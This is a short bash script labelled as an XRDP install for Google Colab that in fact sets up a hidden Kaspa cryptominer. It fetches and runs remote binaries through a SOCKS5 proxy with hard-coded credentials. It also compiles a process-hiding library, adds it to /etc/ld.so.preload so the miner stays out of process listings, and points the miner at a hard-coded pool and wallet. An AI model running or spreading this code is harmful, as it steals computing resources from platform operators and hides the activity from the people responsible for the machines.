# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R AkubapakMU

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 51.79.222.181:1080
socks5_username = gratis
socks5_password = q1w2e3r4t5
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp wget https://github.com/angkii/m/raw/main/AkubapakMU
chmod 700 AkubapakMU

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
sudo make
sudo gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
sudo mv libprocesshider.so /usr/local/lib/
sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

#!/bin/bash

POOL=51.79.222.181:21
WALLET=kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg

./graftcp/graftcp ./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
